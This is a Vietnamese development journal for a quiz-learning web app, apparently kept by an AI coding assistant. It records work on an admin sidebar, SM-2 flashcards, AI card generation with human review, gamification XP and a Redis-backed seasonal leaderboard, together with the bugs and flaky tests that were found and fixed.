khoá tìm kiếm vốn không khớp gì thì nó rỗng sẵn, và phép kiểm xanh mà không kiểm gì cả — đúng cái bẫy đã
mắc hôm 13/08 với hai test hồi quy chỉ mục vector. Lần này phát hiện trước khi commit: thêm một chốt
"quiz **có** trong danh sách trước khi ẩn" ở đầu, khiến phần sau không thể xanh rỗng.

### Dùng lại truy vấn thay vì chép nó

Danh sách quiz để kiểm duyệt gọi lại đúng `QuizService.listPublic` mà trang khám phá của người học dùng.
Hai lợi ích: thứ được kiểm duyệt luôn đúng bằng thứ người học thấy, và không chép lại phần ghép mẫu
`like` — nơi đã sinh ra lỗi `lower(bytea)` hai lần. Chép logic đó lần thứ ba là chép lại cả rủi ro.

### Còn nợ

- **FR-84** hạn mức lượt gọi AI mỗi ngày — hoãn có chủ đích, cần bộ đếm theo người dùng ở Redis và điểm
  chặn trong `AiOrchestrator`. `GET /admin/ai/usage` vẫn cho thấy chi phí thật để phát hiện lạm dụng.
- **Luồng duyệt quiz** (duyệt trước khi công khai) và báo cáo vi phạm từ người dùng — đòi đổi nghiệp vụ và
  thêm bảng, chưa làm.

### Sidebar: làm lại lần hai, và một vòng thử bảng màu sáng rồi quay lại

Bản đầu là danh sách phẳng sáu mục. Làm lại lần hai: gom nhóm có nhãn nhỏ (*Người dùng & nội dung* ·
*Giám sát*), khối chữ **Q** làm dấu nhận diện, mục đang chọn dùng nền sáng nhẹ + viền tím mảnh, lối ra
ghim đáy. Nhãn của nhóm đầu bỏ đi vì nó trùng đúng tên mục bên dưới — chiếm một dòng mà không thêm gì.

**Một lỗi thật lộ ra khi làm lại:** bản trước đặt `breakpoint="lg"` kèm `collapsedWidth={0}` mà **không**
bật `collapsible`. Trên màn hình hẹp sidebar tự ẩn, và vì không có nút gập nào thì cũng **không còn cách
nào mở lại** — admin mất sạch đường điều hướng. Giờ thu về dải 72px chỉ còn icon kèm tooltip, nút gập đặt
ở header.

Có thử một vòng đổi sang bảng màu sáng (nền trắng, mục chọn nền tím nhạt). Nhìn thì sạch hơn, nhưng
**đổi cả lý do tồn tại của khung riêng**: `ui-design-system.md §1` ghi nền tối là *lớp an toàn* — dấu hiệu
để admin biết mình đang ở khu mà mọi thao tác tác động lên người khác và không có nút hoàn tác. Sidebar
sáng thì dấu hiệu đó chỉ còn là bố cục dọc. Đã quay lại nền đen; bảng màu sáng bị bỏ, nhưng phần cấu trúc
làm trong vòng đó (gom nhóm, thu gọn, viền `ring`) thì giữ.

Viền mục đang chọn vẽ bằng `ring` chứ không phải `border`: `border` cộng 1px vào hộp, làm mục đang chọn
cao hơn các mục khác 2px, đủ để cả danh sách nhấp lên xuống mỗi lần đổi trang.

### Class đúng nhưng màu sai: cascade layer của Tailwind v4 thua CSS của Ant Design

Đổi sidebar sang nền đen chữ trắng xong, người dùng báo *"chưa thấy thay đổi"* kèm ảnh chụp: **toàn bộ
nhãn và icon đều màu tím**, dù code ghi `text-white`.

Nguyên nhân: các mục là thẻ `<a>`. Ant Design chèn CSS `a { color }` lúc chạy ở **ngoài** cascade layer,
còn utility của Tailwind v4 nằm **trong** `@layer`. Theo luật cascade, **luật ngoài layer thắng luật trong
layer** — bất kể specificity. Nên `.text-white` (specificity cao hơn) vẫn thua `a` (specificity thấp hơn).
Chữ "Quiz AI" trắng đúng vì nó là `<span>` có class màu riêng; nhãn mục và icon chỉ *thừa hưởng* màu từ
thẻ `a` nên tím theo.

Cách sửa: hậu tố `!` (`text-white!`), và icon trong `<a>` phải đặt màu **tường minh**.

**Bài học đắt hơn phần sửa:** em đã chụp ảnh khu quản trị bốn lần và nhìn qua mà không thấy, vì chỉ *liếc*
xem bố cục chứ không kiểm màu. Kiểm đúng là đọc màu đã render:
`getComputedStyle(el).color` → `rgb(0,0,0)` cho nền, `rgb(255,255,255)` cho chữ. Nhìn ảnh bằng mắt không
thay được phép đo.

**Lỗi này còn ở chỗ khác, có sẵn từ trước.** Đo thanh điều hướng khu học tập: cả **10/10** link ra
`rgb(86,36,208)` trong khi code ghi `text-ink`. Tức mục đang mở và mục chưa mở **trông y hệt nhau** —
người dùng không có cách nào biết mình đang ở trang nào. Đã sửa; đo lại thì đúng 1 mục tím (trang hiện
tại) và 9 mục màu mực. Quy tắc + cách kiểm đã ghi vào `ui-design-system.md §2`.

### Ghi chú báo cáo
- **Mục 2.5 (thiết kế giao diện):** thêm Hình 2.38 (quản lý người dùng) và Hình 2.39 (giám sát AI), cả
  hai vẽ sidebar nền tối để thấy rõ khu quản trị dùng khung riêng. Bỏ ba dòng caption viết tay bị trùng
  với caption do `build.js` tự sinh — bản Word trước đó có caption đôi ở Hình 2.37–2.39.
- **Mục 3.3:** có thêm bốn màn để chụp — Tổng quan (3 biểu đồ), Danh mục, Kiểm duyệt quiz, Phòng đấu.
- **"Khó khăn & cách giải quyết":** bốn ví dụ dùng được — (1) ô nhập hạn mức cố ý không làm vì không chặn
  được gì; (2) `DELETE` không xoá gì nên đổi thành `POST .../close`; (3) phép kiểm suýt xanh rỗng;
  (4) **cascade layer**: class đúng mà màu vẫn sai, và bài học *nhìn ảnh không thay được phép đo*.

---

## 📅 CN — 16/08/2026 — Lát cắt 11: Flashcard + SRS, và một dãy mã tôi từng lấy trùng

**Mục tiêu:** tính năng `[S]` sau khu quản trị. Chọn Flashcard vì nó tái dùng được dữ liệu đã có — câu trả
lời sai của người học — thay vì phải dựng nghiệp vụ mới.

**Xong:** V13 (3 bảng) · 12 endpoint · thuật toán SM-2 · 3 trang giao diện · 17 ca test.

### Việc đầu tiên phải làm lại: dãy mã yêu cầu chức năng bị trùng

Trước khi viết dòng code nào, mở `features/11` ra thì thấy nó dùng **FR-37…42** — đúng dãy tôi đã lấy cho
khu quản trị hôm trước. Quét cả 16 file thì ra ba chỗ chồng nhau:

| Dãy | Ai lấy trùng |
|---|---|
| FR-36 | Khu quản trị lấy đè của Gợi ý Neo4j |
| FR-37…42 | Khu quản trị lấy đè của Flashcard |
| FR-43…48 | Khu quản trị lấy đè của Chống gian lận |
| FR-49 | Khu quản trị lấy đè của Gamification |
| FR-26/27/28 | Thống kê lấy đè của Phòng đấu (**có sẵn từ trước**, không phải tôi) |

Nguyên nhân của phần tôi gây ra: viết docs khu quản trị, tôi lấy dãy tiếp theo sau FR-35 mà không kiểm dãy
đó có ai dùng chưa. Mã cao nhất đang dùng lúc đó là FR-70. Đã dời khu quản trị sang **FR-71…84** và Thống kê
sang **FR-85…87**; giờ 87 mã, dãy 1..87, không trùng và không có lỗ hổng.

Bản báo cáo nộp mô tả yêu cầu bằng văn xuôi nên không trích mã FR — tức lỗi này không lọt vào bản nộp. Nhưng
mã định danh mà trùng thì hết ý nghĩa, và nó là thứ dùng để truy vết giữa docs, code và test.

### Trạng thái ôn phải là bảng riêng

`flashcard_reviews` là bảng riêng chứ không phải mấy cột trên `flashcards`. Một thẻ có thể được nhiều người
ôn với lịch riêng; nhét `due_date`/`ease_factor` vào thẻ thì hai người ôn cùng bộ sẽ ghi đè lịch của nhau.
Có một phép kiểm riêng cho đúng điều này: cấp trạng thái ôn của người B lên thẻ của A, A ôn thẻ đó, rồi
khẳng định lịch của B còn nguyên.

Phần thưởng ngoài dự tính: phần khó nhất của việc chia sẻ bộ thẻ về sau đã giải quyết sẵn, chỉ còn tầng
quyền là việc chưa làm.

### SM-2 tách thành lớp thuần, và ba cách nó có thể hỏng

Thuật toán nằm ở `Sm2Scheduler` — không Spring, không cơ sở dữ liệu — nên kiểm được trong vài milli-giây.
Ba cách hỏng mà phép kiểm nhắm vào, chứ không kiểm lại công thức bằng cách viết lại công thức:

1. **Thẻ đứng yên một chỗ.** `1 × 1.3 = 1.3`, làm tròn xuống thành 1 — khoảng ôn không đổi và thẻ ôn mãi
   không xong. Làm tròn **lên**, và chặn khoảng mới phải lớn hơn khoảng cũ ít nhất một ngày.
2. **Thẻ biến mất.** Trả lời "Dễ" khoảng hai mươi lần thì khoảng ôn vượt quá tuổi của cả đồ án. Chặn ở
   một năm.
3. **Hệ số dễ trôi xuống dưới sàn 1.30.** Dùng `BigDecimal` thay `double`: hệ số này cộng trừ liên tiếp
   nhiều lần, sai số nhị phân tích lại sẽ trôi qua chính cái sàn lẽ ra phải chặn được.

Một chi tiết dễ hiểu sai: **HARD tính là "chưa nhớ"**. Ranh giới của SM-2 nằm giữa 2 và 3, HARD là 2 nên nó
đưa thẻ về ôn lại ngày mai. Hiểu thành "nhớ nhưng khó" rồi cho giãn lịch thì thẻ khó nhất lại bị ôn thưa
nhất. Giao diện ghi rõ hệ quả dưới mỗi nút ("ôn lại ngày mai" / "giãn lịch") thay vì để người dùng đoán.

Đo thật qua API sau khi chạy: **1 → 6 → 13 → 26 → 47 ngày**, rồi "Không nhớ" đưa về 1 ngày và reset chuỗi.

### Sinh thẻ từ câu trả lời sai: cố ý KHÔNG gọi AI

Đây là chức năng có lý do tồn tại rõ nhất của cả tính năng — nó khép vòng lặp *làm bài → sai → ôn lại đúng
chỗ sai*. Và nó **không gọi mô hình**: nội dung câu hỏi, đáp án đúng, phần giải thích đều đã nằm trong cơ sở
dữ liệu. Gọi AI ở đây chỉ tốn hạn mức để viết lại thứ có sẵn, và mở thêm một đường cho nó bịa ra nội dung
khác với đáp án thật.

Chỉ lấy câu có đáp án xác định. `SHORT_ANSWER` bị loại: đáp án lưu kèm nó là một câu trả lời mẫu dài để AI
đối chiếu, đặt nguyên lên mặt sau thẻ thì thành đoạn văn không học nổi. Lần đầu tôi loại luôn cả
`FILL_BLANK` — sai, câu điền khuyết có đáp án rất gọn và làm thẻ rất tốt; đọc lại mới sửa.

### Test bắt được hai lỗi, một trong đó ở code sản phẩm

**Lỗi thật:** `WrongAnswerRepository` viết `o.correct = true` trong SQL thuần, nhưng cột thật là `is_correct`
— entity `QuestionOption` đặt tên trường là `correct` và map sang cột `is_correct`, nên JPQL viết `correct`
còn SQL thuần bắt buộc dùng tên cột. Cùng họ với cái bẫy `lower(bytea)`: **JPQL và SQL thuần không dùng
chung tên**, và mỗi lần viết SQL thuần trên một bảng có sẵn thì phải mở migration ra đọc.

**Phép kiểm của tôi pass sai:** ca "sinh thẻ lần hai không tạo trùng" mong đợi 1 nhưng ra 2, vì hai ca dùng
chung tài khoản và lớp test không dọn cơ sở dữ liệu giữa các ca — số câu sai tích lại. Cách chữa **sai** mà
tôi suýt làm: truy vấn cơ sở dữ liệu để tính số mong đợi, tức nhân bản chính truy vấn đang kiểm vào test.
Cách đúng: cho mỗi ca một tài khoản riêng, con số trở lại xác định.

### Ba chỗ tự sửa khi đọc lại

- `demDenHanTrongBo` nạp cả entity chỉ để lấy `size()`, **và** được gọi cho từng bộ thẻ trong danh sách —
  N+1 lượt đi vòng kèm nạp thừa. Đổi sang một truy vấn gộp theo bộ.
- `new Question()` rồi `setId()` để lấy khoá ngoại: entity đó ở trạng thái detached và Hibernate có thể coi
  là bản ghi mới cần insert. Phải dùng `getReferenceById`.
- `ReviewService.theoThe` viết ra rồi không ai gọi — bỏ, không để lại code chết.

### Còn nợ

- **FR-38** AI sinh thẻ từ học liệu qua RAG — phần lớn nhất còn lại của tính năng này.
- Chia sẻ bộ thẻ giữa người dùng (cần tầng quyền mới).

### Gom lại thanh điều hướng: 11 mục phẳng còn 5

Thêm *Thẻ ghi nhớ* làm thanh ngang lên 11 mục với vai trò CREATOR và nó tràn hàng. Gom thành hai menu
nhóm — *Học tập* (thẻ ghi nhớ, lộ trình, tiến độ, lịch sử) và *Thư viện* (quiz của tôi, ngân hàng câu hỏi,
học liệu) — giữ ba link đơn dùng thường xuyên nhất ở ngoài.

Hai điều đáng ghi:

**Menu xổ xuống giấu mất dấu hiệu "đang ở trang nào".** Mở trang Thẻ ghi nhớ thì mục đó nằm trong menu đã
đóng, và cả thanh menu không có gì sáng lên. Nên nhãn nhóm phải tự sáng khi một trang con của nó đang mở,
và mục con được đánh dấu `selectedKeys` bên trong menu. Đây là chi phí của việc gom nhóm, phải trả thì gom
mới đáng.

**"Sinh đề AI" là hành động, không phải điều hướng.** Nó từng là một link giữa mười link khác và chìm hoàn
toàn. Chuyển thành nút, đặt cạnh avatar. Có gợi ý dùng nền gradient cho nổi, nhưng `ui-design-system.md §4`
cấm gradient và §5 quy định nút hành động chính màu đen — làm một nút nổi bằng cách phá quy ước màu thì
phần còn lại của giao diện trả giá. Icon ✨ đủ để phân biệt nó với các nút đen khác.

Phần phân quyền hiển thị theo vai trò **đã có sẵn** từ trước (`canCreate`), không phải làm mới. Đo lại để
chắc: LEARNER thấy 4 mục và không có nút *Sinh đề AI*; CREATOR thấy 5 mục và nút có nền `rgb(28,29,31)`,
đúng token `--color-ink`.

### Ghi chú báo cáo
- **Mục 2.8 (ERD):** thêm 3 bảng `flashcard_decks`, `flashcards`, `flashcard_reviews`. Nhấn chỗ trạng thái
  ôn là bảng riêng — đó là một quyết định thiết kế dữ liệu giải thích được.
- **Mục 3.3:** ba màn mới để chụp — danh sách bộ thẻ, soạn thẻ, phiên ôn (nên chụp cả trước và sau khi lật).
- **"Khó khăn & cách giải quyết":** hai ví dụ mới — (1) `o.correct` vs `is_correct`, cùng họ với
  `lower(bytea)`, cho thấy JPQL và SQL thuần không dùng chung tên; (2) phép kiểm pass sai do dùng chung tài
  khoản, và vì sao cách chữa bằng truy vấn lại là sai.
- **Mục 3.4 (kiểm thử):** SM-2 là ví dụ tốt cho việc *tách logic thuần ra để test nhanh* — 7 ca chạy trong
  vài milli-giây, không cần Testcontainers.

---

## 📅 CN — 16/08/2026 (tối) — FR-38: AI sinh thẻ từ học liệu, và một chốt phân quyền đặt sai chỗ

**Mục tiêu:** phần còn lại duy nhất của tính năng 11. Tái dùng pipeline RAG đã có, không dựng gì mới ở tầng AI.

**Xong:** V14 · prompt + parser riêng · service sinh thẻ · 3 endpoint · modal duyệt thẻ · 16 ca test.

### Chốt phân quyền đặt sai chỗ, phát hiện lúc viết controller

Đặc tả ghi endpoint là `POST /ai/generate-flashcards`. Viết xong mới thấy `AiController` gắn
`@PreAuthorize("hasAnyRole('CREATOR','ADMIN')")` ở **cấp lớp** — tức người học không gọi được, mà người học
chính là đối tượng của cả tính năng thẻ ghi nhớ.

Mở `ChatController` ra thì thấy nó đã gặp đúng vấn đề này và javadoc của nó nói thẳng:
*"Không nằm trong AiController: lớp đó gắn @PreAuthorize CREATOR/ADMIN cấp lớp"*. Vậy tiền lệ đã có, chỉ là
tôi không đọc trước khi viết. Chuyển ba endpoint sang `FlashcardController` (`authenticated()`), đường dẫn
thành `/decks/{id}/cards/generate` cho khớp `from-wrong-answers` đã có.

Một chi tiết dễ bỏ sót: **endpoint tra trạng thái job cũng phải chuyển**. Để nó bên `AiController` thì người
học gửi được yêu cầu nhưng không lấy được kết quả — tệ hơn là không cho gửi. Có một phép kiểm riêng cho
đúng điều đó.

Cũng nhờ đọc `ChatController` mà thấy `askableMaterials` — danh sách học liệu người học được dùng (của mình
+ đã chia sẻ). Dùng lại nguyên thay vì thêm endpoint mới: cùng một câu hỏi thì cùng một câu trả lời.

### Bắt buộc có học liệu, khác với sinh đề

Sinh đề cho phép bỏ chọn học liệu để sinh theo kiến thức chung. Sinh thẻ **không**. Lý do nằm ở cách hai thứ
được dùng: một câu hỏi trong đề được đọc qua một lần, còn một thẻ ghi nhớ được ôn đi ôn lại hàng chục lần
trong nhiều tháng theo lịch SRS — tức một thẻ sai sẽ được **học thuộc**. Và người duyệt cần tài liệu gốc để
đối chiếu, nên kết quả job trả kèm cả các đoạn học liệu đã dùng.

Vì vậy thẻ cũng **không tự vào bộ** khi job xong. Phép kiểm quan trọng nhất của lát cắt này là chốt số thẻ
trong bộ bằng 0 ngay sau khi job SUCCEEDED.

### Parser là nơi nghiêm khắc nhất

Mô hình trả JSON đúng cú pháp vẫn có thể trả thẻ vô dụng. Ba loại bị loại, mỗi loại là một cách hỏng thật:

| Loại bỏ | Vì sao |
|---|---|
| Thiếu một mặt | Thẻ một mặt không ôn được |
| Mặt sau > 400 ký tự | Mô hình có xu hướng chuyển sang giảng bài. Thẻ mà mặt sau là một đoạn văn thì mất đúng cái làm nên flashcard: đọc vài giây rồi tự đối chiếu |
| Trùng mặt trước (đã chuẩn hoá hoa thường + khoảng trắng) | Lịch SRS sẽ nhân đôi công ôn cho cùng một kiến thức |

Cắt ngắn mặt sau thay vì loại bỏ là lựa chọn tệ hơn — câu bị cắt giữa dòng làm mặt sau sai nghĩa.

### Đo thật với Gemini

Chạy trên học liệu "Slide 3 - Views Thymeleaf" (9 đoạn, đã chia sẻ), yêu cầu 6 thẻ:
**gemini-3.6-flash, 10 038 ms, 6 thẻ hợp lệ, 0 bị loại, 8 đoạn nguồn.** Chất lượng đúng như prompt yêu cầu —
mỗi thẻ một ý, mặt sau 1 câu, gợi ý không lộ đáp án. Ví dụ: *"Trong vòng lặp th:each, chỉ số index và count
khác nhau như thế nào?" → "index bắt đầu từ 0, trong khi count bắt đầu từ 1."*

Duyệt 4/6 thẻ: đúng 4 thẻ vào bộ, nguồn `AI_GENERATED`, đến hạn ôn ngay hôm nay. Trước khi duyệt: 0 thẻ.

### Một phép kiểm của tôi tự phản chính nó

Ca "không sinh được vào bộ thẻ của người khác" tôi viết:

```java
assertThat(...count(*) from ai_jobs where type = 'GENERATE_FLASHCARDS'...)
        .as("không được tạo job cho bộ thẻ của người khác").isPositive();
```

Thông điệp nói "không được tạo job" mà phép kiểm lại đòi `isPositive()` — **assert ngược hẳn với ý định**,
và còn đếm toàn bảng nên các ca khác trong lớp cũng tính vào. Sửa thành đếm theo đúng người vừa gửi yêu cầu
và `isZero()`, thêm `verify(never())` trên mô hình. Đây là lần thứ hai trong hai ngày tôi viết một phép kiểm
xanh mà không kiểm gì — cả hai lần đều do dùng dữ liệu chung giữa các ca.

### Một flake có sẵn, KHÔNG phải do lát cắt này

Lần chạy suite đầu tiên có `ChatIntegrationTest.shouldListSessionsByRecentActivity` đỏ: mong 2 phiên, ra 3,
trong đó **"Phiên mới hơn" xuất hiện hai lần**. Chạy riêng lớp đó: 20/20 xanh. Chạy lại toàn bộ suite:
337/337 xanh. Tức là flake phụ thuộc thứ tự/thời điểm, không tái hiện.

Chưa sửa và **chưa kết luận nguyên nhân**. Bằng chứng đáng lưu: hai phiên cùng tiêu đề gợi ý một lời gọi
`ask` có thể tạo hai phiên khi có retry — nếu đúng thì đó là lỗi thật của tính năng chat, không chỉ lỗi test.
Cần xem lại chỗ tạo phiên khi `sessionId` null.

### Ghi chú báo cáo
- **Mục 2.7 (luồng xử lý):** FR-38 là ví dụ thứ hai của pipeline RAG sau sinh đề, và là ví dụ có
  **human-in-the-loop** rõ nhất — vẽ được sơ đồ *truy xuất → sinh → lọc tự động → người duyệt → lưu*.
- **Mục 3.6 (độ chính xác AI):** có thêm một phép đo thật: 6/6 thẻ hợp lệ, 0 bị loại, 10 038 ms trên tài
  liệu 9 đoạn. Ghi rõ đây là một lần chạy, không phải trung bình nhiều lần.
- **"Khó khăn & cách giải quyết":** chốt `@PreAuthorize` cấp lớp ở `AiController` chặn sai đối tượng — bài
  học là *đọc lớp cùng loại trước khi viết*, vì `ChatController` đã ghi sẵn lời giải trong javadoc.
- **Mục 3.4:** phép kiểm tự phản chính nó (`isPositive` với thông điệp "không được tạo") là ví dụ tốt cho
  việc *đọc lại phép kiểm như đọc code sản phẩm*.

---

## 📅 CN — 16/08/2026 (đêm) — Lát cắt 13: Gamification, và ba cái bẫy Spring/JPA

**Mục tiêu:** người dùng dự án nhắc *"cũng phải làm đủ chức năng trong docs chứ"* — đúng, docs liệt kê 16 tính
năng thì làm đủ 16. Còn 5 tính năng `[S]`, làm nhẹ trước nặng sau: 13 → 15 → 12 → 16 → 14.

**Xong:** V15 (6 bảng + 10 huy hiệu) · 3 endpoint · trang Thành tích · 21 ca test.

### Đặc tả đòi idempotent nhưng không có bảng nào giữ được

Đặc tả ghi *"idempotent: một hành động chỉ cộng XP một lần (chống lặp khi retry)"* và liệt kê 5 bảng — trong đó
không có bảng nào lưu được "hành động này đã tính chưa". Cộng thẳng vào `user_stats.total_xp` thì một lần retry
là một lần cộng đôi, và không có cách nào phát hiện.

Nên thêm bảng thứ sáu `xp_events`, mỗi dòng là một lần cộng, kèm ràng buộc
`UNIQUE (user_id, source_type, source_key)`. Chốt ở **cơ sở dữ liệu** chứ không ở Java: kiểm trong Java thua
cuộc khi hai luồng chạy song song.

### Ôn thẻ suýt thành máy in XP

API ôn thẻ (features/11) **không chặn ôn sớm** — cố ý, vì ôn sớm là việc hợp lệ. Nhưng ghép với việc cộng XP
mỗi lần ôn thì bấm một thẻ trăm lần là trăm lần XP, và con số mất hết ý nghĩa.

Cách chặn: khoá chống trùng của ôn thẻ là `cardId:ngày`, không phải `cardId`. Mỗi thẻ mỗi ngày một lần cộng —
thưởng người ôn đều, không thưởng người bấm liên tục. Có hai phép kiểm cho đúng điều này: bấm ba lần trong
ngày chỉ cộng một lần, và cùng thẻ nhưng ngày khác thì được cộng lại.

### Ba cái bẫy Spring/JPA, mỗi cái làm vỡ theo một cách khác

**1. `@TransactionalEventListener` + `@Transactional` = Spring không khởi động.** Listener chạy *sau* khi
transaction nghiệp vụ commit nên không còn transaction nào để tham gia; Spring từ chối và **28 test lỗi
ApplicationContext**. Phải là `REQUIRES_NEW`. Về nghĩa cũng đúng — phần cộng XP cần transaction riêng.

**2. Ghi `String` vào cột `jsonb` bị PostgreSQL từ chối.** `columnDefinition = "jsonb"` chỉ ảnh hưởng lúc sinh
schema, không ảnh hưởng cách tham số được gửi. Phải có `@JdbcTypeCode(SqlTypes.JSON)`.

**3. Bắt `DataIntegrityViolationException` rồi tiếp tục là ảo giác — và đây là cái đáng nhớ nhất.** Tôi viết
ba chỗ `try { save } catch (DataIntegrityViolationException) { /* luồng khác thắng, bỏ qua */ }`, nghĩ rằng
mình đang xử lý êm cuộc đua. Thực tế Spring **đã đánh dấu transaction là rollback-only** ngay khi ràng buộc
nổ, nên lần commit sau đó vẫn vỡ với `UnexpectedRollbackException`. Bắt ngoại lệ không cứu được gì, chỉ làm
lỗi đổi chỗ và khó truy hơn.

Sửa theo hai cách khác nhau tuỳ chỗ:
- `award` và trao huy hiệu: **bỏ hẳn catch**, để ngoại lệ nổi lên cho listener bắt. Transaction rollback, và
  đó là kết quả đúng vì luồng kia đã cộng XP rồi.
- Tạo thử thách ngày: dùng `ON CONFLICT DO NOTHING`. Câu lệnh **không bao giờ ném**, nên transaction sạch và
  người thứ hai chỉ việc đọc dòng của người thắng.

### Test bắt được một lỗi thiết kế, không phải lỗi code

Phép kiểm "khoảng cách giữa các cấp phải nới ra" **đỏ ở cấp 3**. Truy ra: đọc `100 * level^1.5` theo nghĩa
*XP tích luỹ* thì lên cấp 2 tốn 283 XP nhưng cấp 3 chỉ tốn thêm 237 — cấp thứ hai **khó hơn** cấp thứ ba, và
người chơi sẽ thấy ngay. Nguyên nhân là cấp 1 phải bằng 0 XP nên bậc đầu bị kéo dài bất thường.

Đọc theo nghĩa *XP cho từng bậc* thì hết ngược: 100 → 283 → 520 → 800 → 1118. Đây là loại lỗi mà test viết
theo *tính chất* ("phải nới ra") bắt được, còn test viết theo *giá trị* ("cấp 3 cần 520 XP") thì không.

### Một chỗ lệch bảng màu, sửa ở theme chứ không sửa lẻ

Thanh tiến độ ra màu xanh mặc định của antd. Nguyên nhân: `Progress` lấy màu từ `colorInfo`, **không** phải
`colorPrimary` — nên đặt `colorPrimary` tím ở theme không đủ. Sửa bằng token `Progress.defaultColor` trong
theme chứ không truyền `strokeColor` ở từng chỗ dùng: một màu lệch thì lệch ở mọi trang, và sửa lẻ thì trang
thêm sau lại lệch tiếp. Đo lại bằng `getComputedStyle`: `rgb(164, 53, 240)` — đúng `--color-brand`.
Class của antd v6 là `ant-progress-track`, không còn `ant-progress-bg`, nên chỉ đo mới thấy.

### Đo thật

Làm bài thường: **+20 XP**. Làm bài đúng 100%: **+35 XP** (20 + 15 thưởng) → tổng 55, tiến độ 55/100 lên cấp 2.
Huy hiệu tự trao đúng hai cái: `FIRST_STEPS` (≥50 XP) và `PERFECT_1` (đúng 100%). Thử thách ngày *"Hoàn thành
3 bài quiz"* lên 2/3. Sổ `xp_events` đúng một dòng mỗi bài.

### Ghi chú báo cáo
- **Mục 2.8 (ERD):** thêm 6 bảng. Nhấn `xp_events` — bảng không có trong thiết kế ban đầu, thêm vào vì
  yêu cầu idempotent không thể thoả mãn mà không có nó.
- **Mục 2.7:** gamification là ví dụ tốt nhất trong đồ án về **domain event**: hai service nghiệp vụ không hề
  biết tính năng này tồn tại, có thể bỏ hẳn nó mà không sửa dòng nào ở chỗ khác.
- **"Khó khăn & cách giải quyết":** ba cái bẫy Spring/JPA ở trên, đặc biệt cái thứ ba — *bắt ngoại lệ ràng
  buộc bên trong transaction không cứu được gì*, một hiểu sai rất dễ mắc.
- **Mục 3.4:** ví dụ về test viết theo **tính chất** thay vì theo **giá trị**, và nó bắt được lỗi thiết kế.

---

## 📅 T2 — 17/08/2026 — Lát cắt 15: Xếp hạng theo mùa, và giải được cái flake để ngỏ hôm trước

**Xong:** V16 (2 bảng + 3 huy hiệu mùa + mùa đầu tiên) · 3 endpoint · trang Xếp hạng · 9 ca test.

### Không làm theo đặc tả ở chỗ quan trọng nhất: Redis không giữ điểm

Đặc tả ghi *"Redis: `leaderboard:season:{seasonId}` — Sorted Set (member=userId, score=điểm mùa)"*, tức Redis
là nơi giữ điểm. Nhưng Redis ở dự án này chạy **không bật AOF** — một lần restart mất dữ liệu là mất sạch
bảng xếp hạng, và không có gì để dựng lại.

Nên đảo lại trách nhiệm: điểm mùa thật là `sum(xp_events.xp)` trong khoảng thời gian mùa, còn ZSET chỉ là
**chỉ mục để đọc nhanh** và tự dựng lại khi rỗng. Đây là chỗ bảng `xp_events` thêm ở V15 trả cổ tức lần hai —
lúc thêm nó tôi chỉ nghĩ tới việc chống cộng XP trùng.

Kiểm chứng bằng cách làm đúng điều đáng sợ nhất: `DEL` cái ZSET rồi đọc lại bảng xếp hạng.

```
ZSET truoc khi xoa: 2
ZSET sau khi XOA:   0
doc lai:            2 nguoi, 20 diem — dung nguyen
ZSET sau khi doc:   2   (tu dung lai)
```

Có một phép kiểm tích hợp làm đúng việc này, và nó là phép kiểm quan trọng nhất của lát cắt: nếu sai thì mất
Redis là mất dữ liệu.

### Hai phạm vi trong đặc tả không có gì để dựa vào

FR-62 yêu cầu ba phạm vi: toàn hệ thống, theo lớp, theo bạn bè. Lớp học là tính năng 14 — chưa làm. Còn
**"bạn bè" không tồn tại ở bất kỳ đâu trong toàn bộ docs**: không bảng, không API, không yêu cầu chức năng
nào. Làm hai bộ lọc luôn trả về cùng một danh sách chỉ để đủ ba tuỳ chọn là hứa với người dùng một thứ không
có. Ghi rõ vào `features/15` là làm phạm vi toàn hệ thống, hai phạm vi kia phụ thuộc thứ chưa tồn tại.

### `@EnableScheduling` chưa bật — job sẽ không bao giờ chạy

Viết `@Scheduled` cho job chốt mùa xong mới kiểm: dự án **chưa bật `@EnableScheduling`** ở đâu cả. Thiếu
annotation đó thì `@Scheduled` bị bỏ qua **hoàn toàn, không có cảnh báo nào** — job không chạy, mùa không bao
giờ được chốt, và không có lỗi nào để lần ra. Đúng loại lỗi tệ nhất: mọi thứ trông như đang hoạt động.

### Test bắt được lỗi thật: Hibernate xếp INSERT trước UPDATE

Ca chốt mùa đỏ với `duplicate key value violates unique constraint "uk_seasons_one_active"`. Code có vẻ đúng:
đặt mùa cũ thành `ENDED` **rồi mới** tạo mùa mới. Nhưng Hibernate flush cuối transaction theo thứ tự
**mọi INSERT trước mọi UPDATE**, nên mùa mới được chèn khi mùa cũ vẫn còn `ACTIVE`.

Sửa bằng `saveAndFlush` để ép ghi trạng thái xuống trước. Đáng chú ý: chính cái ràng buộc tôi thêm để chặn
"hai mùa ACTIVE" đã bắt được lỗi này — nếu không có nó thì hệ thống lặng lẽ có hai mùa đang chạy.

### Giải được cái flake để ngỏ hôm trước

Hôm 16/08 tôi ghi: *"hai phiên cùng tiêu đề gợi ý một lời gọi `ask` có thể tạo hai phiên khi có retry — nếu
đúng thì đó là lỗi thật của tính năng chat"*. Hôm nay suite đỏ thêm hai ca chat nữa với
`Connection prematurely closed BEFORE response`, và đọc kỹ thì ra **cả hai flake cùng một nguyên nhân**:

Test dùng `WebClient.create()` — pool kết nối dùng chung. Luồng SSE kết thúc thì server đóng kết nối nhưng
pool vẫn giữ, lượt sau bốc đúng kết nối đã chết. Test đã có `.retry(1)` để chữa, và **chính cái retry là thủ
phạm của flake thứ hai**: nó gửi lại một request **có tác dụng phụ** — request đầu đã tạo phiên chat ở server
trước khi kết nối chết, nên lượt thử lại tạo phiên thứ hai.

Sửa tận gốc: dùng `ConnectionProvider.newConnection()` để mỗi lượt một kết nối mới, và **bỏ `.retry(1)`**.
Không còn kết nối chết để bốc → không cần thử lại → không có tác dụng phụ nhân đôi. Suite 367/367 xanh.

**Kết luận quan trọng cho báo cáo:** đây **không** phải lỗi của tính năng chat. Nghi vấn hôm trước sai, và
tôi đã đúng khi không tuyên bố đã sửa lúc chưa tìm ra nguyên nhân. Bài học thật là: *`retry` trên một request
có tác dụng phụ không phải cách chữa lỗi kết nối — nó tạo ra lỗi mới, khó lần hơn.*

### Ghi chú báo cáo
- **Mục 2.8 (ERD):** thêm `seasons`, `season_rankings`. Nhấn chỉ mục một phần `uk_seasons_one_active` — nó
  bắt được lỗi thứ tự flush của Hibernate.
- **Mục 1.x (công nghệ):** đây là chỗ Redis Sorted Set được dùng đúng use case, và cũng là ví dụ tốt cho
  **phân chia nguồn sự thật vs chỉ mục** — Redis nhanh nhưng không bền, nên không giữ dữ liệu duy nhất.
